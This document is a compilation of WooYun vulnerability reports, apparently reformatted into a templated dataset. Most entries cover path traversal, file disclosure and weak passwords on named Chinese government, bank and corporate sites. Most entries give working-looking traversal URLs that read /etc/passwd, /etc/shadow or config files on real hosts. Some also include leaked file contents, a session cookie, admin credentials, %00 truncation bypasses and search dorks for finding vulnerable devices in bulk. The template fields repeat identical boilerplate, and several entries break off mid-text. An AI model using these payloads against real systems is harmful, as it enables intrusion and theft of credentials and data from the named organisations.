**详情**: post请求包：POST /admin/index.php HTTP/1.1Content-Length: 129Content-Type: application/x-www-form-urlencodedReferer: http://asc.ecnu.edu.cn/Cookie: PHPSESSID=skft5i5v6gh5q11hb3opo6ipb5; bdshare_firstime=1445850501693; BAIDUID=75E343819BEA9BDD03EBC27436B1B0C5:FG=1; phpMyAdmin=6ufk3kt1gt426oidmdlgfp5ntittttg4; pma_lang=en; pma_collation_connection=utf8_general_ciHost: asc.ecnu.edu.cnConnection: Keep-ali

**POC**: (见原文)

**绕过**: 过滤绕过, 截断攻击

**修复**: 这个你们更懂，我就不多说了！
---

---
### [wooyun-2013-045648] 联想某分站又一任意文件下载漏洞，外加一个弱口令
**厂商**: 联想 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 联想移动工商解决方案：http://mia.relonline.cn/download.php?file=/../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/ma

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 下载参数过滤、加强密码安全意识啊...
---

---
### [wooyun-2014-079370] 浙江在线网站敏感文件下载
**厂商**: zjol.com.cn | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sznews.zjol.com.cn/tgxt/可下载网站敏感文件,如http://sznews.zjol.com.cn/tgxt/Web.confighttp://sznews.zjol.com.cn/tgxt/admin.aspx.cshttp://sznews.zjol.com.cn/tgxt/index.aspx.cshttp://sznews.zjol.com.cn/sznews/dxbbs8-access/Dxbbs8.aspx  数据库http://sznews.zjol.com.cn/sznews/dxbbs8-access/Forum.config 配置文件  等

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2013-034311] 国家电网西北电网有限公司备份文件下载
**厂商**: 国家电网公司 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除备份文件,对于有恶意的人,这个备份文件有不错的利用价值..社工嘎嘎。
---

---
### [wooyun-2016-0170653] ICARE香港GLASSFISH服务器存在通用任意文件读取漏洞（香港地區）
**厂商**: ICARE | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 通过shodan查找存在漏洞的应用服务器http://**.**.**.**https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201601/20173918c7c68e074b1626afbd3e9806b33c9e7b.pnghttps://**.**.**.**/search?query=glassfish++port%3A4848+country%3Ahk+4.12. 尝试服务器遍历目录**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/databases/

**POC**: 如上

**绕过**: 直接利用

**修复**: 升级GLASSFISH版本到4.1.1
---

---
### [wooyun-2015-0157251] 雲林縣某衛生局LFI漏洞（臺灣地區）
**厂商**: 雲林縣衛生局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在LFI!

**POC**: http://**.**.**.**/inc/dl.php?p=../ufiles/&f=../inc/dl.php

**绕过**: 直接利用

**修复**: 建議 basename 過濾一下
---

---
### [wooyun-2013-020012] 多家单位深信服设备敏感文件下载(补丁不及时),可成功控制设备  (3)  ---大结局
**厂商**: 多家政府相关单位 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖北省信访局https://hubeixf.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf湖北省政府法制信息网https://hbzffz.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf榆林市发改委https://yldrc.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf湖北省社会科学院https://hbsky.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf石家庄文联https://sjzwl.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf湖北省人民政府参事室https://hbcss.gov.cn/tmp/updateme/sinfor/ad/sys/sys

**POC**: 参照前面提交的两个同类问题，我就不一一截图了（发稿前本人均已一一验证过）！简单分享下检测方法(Google语法)：1、intitle:sangfor ad2、inurl:cgi-bin/frame_main.cgi (更精确)另：写个小工具可能更方便，但是得消耗很多时间批量IP段...

**绕过**: 直接利用

**修复**: 补丁啊补丁，你在哪里？
---

---
### [wooyun-2014-067162] 某地方银行银行任意文件下载
**厂商**: 渤海银行 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞URL:https://ebank.cbhb.com.cn/webappservice/TP050102.do?FileName=../../../../../../../../../../../../../../../../../../../etc/passwd

**POC**: 截图：

**绕过**: 直接利用

**修复**: 业务比较敏感，没有进一步测试。
---

---
### [wooyun-2012-013725] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  联众世界大量敏感信息泄露
**厂商**: 联众世界 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://auth.ourgame.com/WEB-INF/web.xmlhttp://auth.ourgame.com/WEB-INF/classes/data.xml<?xml version="1.0" encoding="utf-8" ?>- <xml-data>- <url><webhall-ddz>http://ddz.lianzhong.com/default.aspx</webhall-ddz><webhall-fish>http://fish.lianzhong.com/default.aspx</webhall-fish><webhall-twomj>http://mj

**绕过**: 直接利用

**修复**: 如上！
---

---
### [wooyun-2015-0106333] 中国电信某省级播放平台综合管理系统后台弱口令
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 平台地址：http://117.27.135.247/login.aspx帐号admin密码123456

**POC**: 任意文件下载：http://117.27.135.247/view/cloud/ExpApp_DownloadFile.aspx?FileName=../../web.config该站目录浏览权限未关大量帐号弱口令

**绕过**: 直接利用

**修复**: 关闭目录浏览修改弱口令等等
---

---
### [wooyun-2013-021324] JBR-CMS Version:V5.0 直接越权添加管理员与任意目录遍历漏洞
**厂商**: 武汉金百瑞科技 | **年份**: 2013 | **类型**: 重要资料/文档外泄

**元思考**: 触发信号: 功能测试

**洞察**: 重要资料/文档外泄防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要资料/文档外泄相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /AdminManage/WebManagement/UsersManagement/UsersAdd.aspx/AdminManage/FileManagement/SelectFile.aspx

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂家懂的！
---

---
### [wooyun-2016-0196643] 中国移动积分商城某处任意文件读取
**厂商**: 中国移动 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**//resin-doc/examples/security-basic/viewfile?file=WEB-INF/password.xmlhttp://**.**.**.**//resin-doc/examples/security-basic/viewfile?file=WEB-INF/WEb.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020306] 搜狗某应用任意文件读取问题！
**厂商**: 搜狗 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狗浏览器的主站啊：ie.sogou.com

**POC**: http://ie.sogou.com/tools/?route=ucenter/tools/imgshow&path=/../../../etc/passwd知晓了Nginx路径（貌似看到有往日志里写入所谓php一句话，不知道是不是利用Nginx解析漏洞），读取Nginx配置文件：http://ie.sogou.com/tools/?route=ucenter/tools/imgshow&path=/../../../usr/local/nginx/conf/nginx.conf然后找error.log日志文件，错误文件有时会报一些文件路径：http://ie.sogou.com/tools

**绕过**: 直接利用

**修复**: 限制文件读取路径或用户输入路径！
---

---
### [wooyun-2014-051478] 大汉版通JIS统一身份认证系统某处任意文件下载漏洞及一个小越权漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某处存在一个问题，可以遍历所有的用户名，同时包含组织结构！领导名字都泄漏了啊http://www.gansu.gov.cn/jis/objectbox/selx.jsp?tabid=1&limit=1&f_id=userid&f_name=vc_username&date=http://ln-n-tax.gov.cn/jis/objectbox/selx.jsp?tabid=1&limit=1&f_id=userid&f_name=vc_username&date=

**POC**: 另外一处还存在一个任意文件下载的问题！需要注册的先去/jis/front/userregister.jsp 注册一个用户。有部分是无需登录的jis/manage/databak/showlog.jsppath参数String strTitle = "机构信息→恢复";String path = Convert.getParameter(request,"path");String strFilePath = application.getRealPath("");strFilePath = strFilePath+"/manage/databak/databakbag/"+path;TxtHa

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-096508] 中国邮政储蓄某分站资料下载
**厂商**: 中国邮政储蓄银行 | **年份**: 2015 | **类型**: 网络未授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 网络未授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络未授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://218.65.112.148:81/应该是内部服务器对外了吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013323] 53KF企业在线平台LFI一枚
**厂商**: 53KF企业在线平台 | **年份**: 2012 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://chat.53kf.com/login.php/修改请求Cookie: customer_service_language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00结果：加上phpinfo提供的信息：未经授权....不进一步了。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-052094] 安踏商城任意文件读取漏洞
**厂商**: anta.com | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在测试安全问题的时候，发现了某处存在文件包含漏洞，而且权限很高为root权限。首先确定环境。大小写法。www.anta.com/index.php正常访问。www.anta.com/indeX.php提示文件不存在。确定系统为linux。如果存在文件包含，则可能读取/etc/password（如果权限够）。经排查，发现一处文件包含漏洞，并且权限为root权限。

**POC**: 同上

**绕过**: 直接利用

**修复**: PHP页面：REQUEST["app_page"]=preg_replace("\.\.","",REQUEST["app_page"]);=========只是我最省事的写法。还请专业人士改进！
---

---
### [wooyun-2014-069920] 某市住房公积金网站任意文件下载
**厂商**: km.gov.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://zfgjj.km.gov.cn/website/website.do?act=download&id=2810&path=c:\Windows\win.ini&name=win.ini

**POC**: ; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-064271] 搜狐某服务器配置不当敏感信息泄露(各种源码+数据库备份文件下载)
**厂商**: 搜狐 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先看猪猪侠的这个漏洞WooYun: 搜狐某分站敏感信息泄露#服务器地址220.181.90.31#泄露信息http://csldata.sports.sohu.com/admin.ziphttp://csldata.sports.sohu.com/backup.ziphttp://220.181.90.31/sql.rarhttp://220.181.90.31/www.rar

**POC**: http://csldata.sports.sohu.com/admin.ziphttp://csldata.sports.sohu.com/backup.ziphttp://220.181.90.31/sql.rarhttp://220.181.90.31/www.rar每个压缩包中都有账号与密码，我就不一一举例了。

**绕过**: 直接利用

**修复**: 删除备份文件
---

---
### [wooyun-2013-025698] 一批国家级和省级地震信息网任意文件下载，个个能下/etc/shadow
**厂商**: 国家级和省级地震信息网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家级：中国地震信息网：http://www.csi.ac.cn漏洞点：http://www.csi.ac.cn/manage/content/docmanage/download.jsp?filePath=/../../../../etc/shadow中国地震局地震预测研究所：http://www.seis.ac.cn漏洞点：http://www.seis.ac.cn/manage/content/docmanage/download.jsp?filePath=/ycszsxx/../../../../../etc/shadow省级：黑龙江地震信息网：http://www.eq-hl.com漏洞点：http://www.eq-hl.com/manage/content/docmanage/download.jsp?filePath=/rsc/../../../../../etc/shad

**POC**: 中国地震信息网的/etc/shadow这些shadow文件有被破解可能。由于我的机器运算能力和内存有限，就不破解了。估计用彩虹表破解花不了多少时间:-)

**绕过**: 直接利用

**修复**: 白名单过滤，黑名单太容易被绕过了特别注意，中国地震信息网和中国地震局地震预测研究所对外开放ssh端口，建议关闭
---

---
### [wooyun-2015-095355] 17173某站任意文件读取
**厂商**: 17173游戏 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://58.22.102.45/resin-doc/viewfile/?file=/doc/install.xtp/doc/install.xtp<document><header><product>resin</product><version>Resin 3.0</version><title>Resin Installation</title></header><body><summary/></body></document>http://58.22.102.45/resin-doc/viewfile/?file=index.jspindex.jsp<%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %><%--This is the default start pag

**POC**: http://58.22.102.45/resin-doc/viewfile/?file=/doc/install.xtp/doc/install.xtp<document><header><product>resin</product><version>Resin 3.0</version><title>Resin Installation</title></header><body><summary/></body></document>http://58.22.102.45/resin-doc/viewfile/?file=index.jspindex.jsp<%@ page sessi

**绕过**: 直接利用

**修复**: 略
---

---
### [wooyun-2015-0164324] 中华人民共和国交通运输部某站任意文件读取
**厂商**: 中华人民共和国交通运输部 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：http://**.**.**.**:9000/POST /wcm/console/auth/reg_newuser_dowith.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/wcm/console/auth/reg_newuser.jspCook

**POC**: URL：http://**.**.**.**:9000/POST /wcm/console/auth/reg_newuser_dowith.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-064150] 361度任意文件读取
**厂商**: 三六一度(中国)有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ir.361sport.com/html/print_page_index.php?file_name=../../../../../../../../../../etc/passwdhttp://ir.361sport.com/s/print_page_index.php?file_name=../../../../../../../../../../etc/passwdhttp://ir.361sport.com/c/print_page_index.php?file_name=../../../../../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我更懂。
---

---
### [wooyun-2015-0113330] 教育部下属某网络安全测评中心网站权限配置不当被黑
**厂商**: 教育部 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 教育信息安全等级保护测评中心是从事教育信息系统安全等级测评、信息安全评估等安全服务的第三方检测评估机构。通过国家信息安全等级保护测评机构资质认证，挂靠教育部教育管理信息中心教育信息安全等级保护工作专题网站：http://dengbao.moe.edu.cn据说和公安部网络安全保卫局的中国信息安全等级保护网有合作目录遍历 到处是马 工具一连果然是Webdav有写入权限 看看大黑客的一句话 菜刀连之有不少会务信息 还有提权痕迹 但看样子应该也是才黑不久  望引起重视就这域名被诈骗、黑产利用了的话 还真没人不信的而且还在负责网络安全检测的测评中心自己的专题网站，确实是让人诧异了

**POC**: 教育信息安全等级保护测评中心是从事教育信息系统安全等级测评、信息安全评估等安全服务的第三方检测评估机构。通过国家信息安全等级保护测评机构资质认证，挂靠教育部教育管理信息中心教育信息安全等级保护工作专题网站：http://dengbao.moe.edu.cn目录遍历 到处是马 工具一连果然是Webdav有写入权限 看看大黑客的一句话 菜刀连之有不少会务信息 还有提权痕迹 但看样子应该也是才黑不久  望引起重视就这域名被诈骗、黑产利用了的话 还真没人不信的

**绕过**: 直接利用

**修复**: 1、清理木马程序2、禁止webdav3、关闭写权限
---

---
### [wooyun-2014-064730] 搜狗某站点任意文件读取(2)
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在案例：http://wooyun.org/bugs/wooyun-2010-064342中，你们确实已经对path进行了限制。如今访问会空白，如下图：好了，看样子这个点暂时没有了。通过对目录的遍历以及一些页面的扫描，结合fuzz之后。得到了head.html也有调用的成分。但是这次没有上次那么完整，需要配合%00截断如图：http://ie.sogou.com/user/head.html?size=../../../../../../../../../etc/passwd%00.jpg

**POC**: 再读：http://ie.sogou.com/user/head.html?size=../../../../../../../../../etc/profile%00.jpg

**绕过**: 截断攻击

**修复**: 嗯。。应该知道怎么修了，这次千万不要在只修一个地方了。看看代码还有哪些地方有类似调用的，fix掉吧。
---

---
### [wooyun-2015-0122333] 敏感信息泄露之爱帮网任意文件读取&敏感信息泄露
**厂商**: 爱帮网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、resin-dochttp://nj.aibang.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jspweb.xml2、phpinfohttp://basset.aibang.com/phpinfo.php

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 删除resin-doc
---

---
### [wooyun-2015-0105117] 句酷批改网某分站任意文件下载影响大量分站#1
**厂商**: pigai.org | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 句酷批改网某分站任意文件下载影响大量分站

**POC**: http://bec.pigai.org/?core-dl&f=/../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sb

**绕过**: 直接利用

**修复**: 运维约嘛？（送礼物）
---

---
### [wooyun-2015-0134275] 宁波大学某分站平台任意文件下载漏洞
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/jxjy/query.do?method=downloadFile&type=xls&path=web-inf\web.xml&ajax=AJAXhttp://**.**.**.**/jxjy/query.do?method=downloadFile&type=xls&path=login.jsp&ajax=AJAX

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010977] 云南省某政府网站任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ynjst.gov.cn:82/ghc/editor/down.jsp?path=../../../../../../../etc&file=shadow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2015-0146697] 中国人寿某站存在resin目录遍历漏洞导致内部多数据库信息泄露
**厂商**: 中国人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Resin for Windows实现上存在多个漏洞，远程攻击者可能利用此漏洞非授权获取敏感信息。Resin没有正确过滤通过URL传送的输入，允许远程攻击者通过在URL中提供有任意扩展名的DOS设备文件名从系统上的任意COM或LPT设备读取连续的数据流、通过目录遍历攻击泄露Web应用的WEB-INF目录中的文件内容，或通过包含有特殊字符的URL泄露到Caucho Resin服务器的完整系统路径。http://116.236.239.102/servlet/com.zotn.screens.HomeProxyServlethttp://116.236.239.102/%20../web-inf/各种内部信息泄露数据库信息泄露还有这个http://112.64.153.38/servlet/com.zotn.screens.HomeProxyServlet

**POC**: http://116.236.239.102/servlet/com.zotn.screens.HomeProxyServlethttp://116.236.239.102/%20../web-inf/各种内部信息泄露数据库信息泄露还有这个http://112.64.153.38/servlet/com.zotn.screens.HomeProxyServlet

**绕过**: 直接利用

**修复**: 升级版本
---

---
### [wooyun-2014-086911] 中国人寿某系统目录遍历可发现大量内部文件、vnc帐号等
**厂商**: 中国人寿 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.发现了这：http://106.37.195.128:8888/http://106.37.195.129/2.发现一些业务报表，不知道是不是可以公开的？业绩一览表：还有一些照片：身份证信息：svn地址，帐号，可用性：内部发文：

**POC**: 1.发现了这：http://106.37.195.128:8888/http://106.37.195.129/2.发现一些业务报表，不知道是不是可以公开的？业绩一览表：还有一些照片：身份证信息：svn地址，帐号，可用性：内部发文：

**绕过**: 直接利用

**修复**: 改之
---

---
### [wooyun-2014-072011] 某通用型CMS任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 相关厂商重庆康邦科技有限公司官网http://www.issence.com/选取了一些相关实例1.重庆北碚服务外包网http://www.cqbbsourcing.gov.cn/download.php?file=./../includes/config_inc.php2.西南大学--药学实验教学中心http://yxxf.swu.edu.cn/download.php?file=./../includes/config_inc.php3.重庆两江假日酒店管理有限公司http://www.cqljjr.com/download.php?file=./../includes/config_inc.php4.重庆呼吸机http://www.cqxiaoma.com/download.php?file=./../includes/config_inc.php5.西南大学药学院http://ph

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2014-048201] 建站之星后台任意文件读取
**厂商**: 建站之星 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问：http:/target/sitestar/admin/index.php?_m=../../robots.txt%00&_a=admin_addrobots.txt是系统自带，虽然是后台文件，但是其实无需管理员权限即可访问如图：win下:http://target/sitestar/admin/index.php?_m=../../../../../../../../../../windows/win.ini%00.jpg&_a=admin_add未测试linux的环境，不过应该大同小异:http://target/sitestar/admin/index.php?_m=../../../../../../../../../../etc/passwd%00.jpg&_a=admin_add

**POC**: 略

**绕过**: 直接利用

**修复**: load.php中$act =& ParamHolder::get('_m'); 这里加个验证，不许存在case3即ok？不知道我说的对不对。
---

---
### [wooyun-2014-065436] 倍优天地目录遍历+后台管理员账户泄露
**厂商**: 倍优天地 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x00通过Burp Suite爬行网站目录，获取得upload目录和admin目录；0x01通过访问http://www.beyo.com.cn/beyo/uploads/，发现网站存在目录遍历漏洞，并存在有sql敏感文件；0x02下载beyo.sql发现里面有管理员账户；0x03通过http://www.beyo.com.cn/admin/输入管理员的账户和密码可登录应用后台并编辑网站内容。

**POC**: 漏洞证明见详细说明。

**绕过**: 直接利用

**修复**: 1.建议把服务器上的敏感文件删除；2.建议设置较严格的访问控制权限。
---

---
### [wooyun-2013-025409] 中科院某研发中心目录遍历致暴库
**厂商**: 中科院南京宽带无线移动通信研发中心 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中科院南京宽带无线移动通信研发中心网站存在目录遍历，数据库可任意下载用得到的前后台密码顺利登入，后台不可直接登录，要通过前台登入数据库可备份、上传文件类别可设置甚至可以自己加广告来赚钱，广告管理工具的帐号密码是弱口令admin

**POC**: 如上

**绕过**: 直接利用

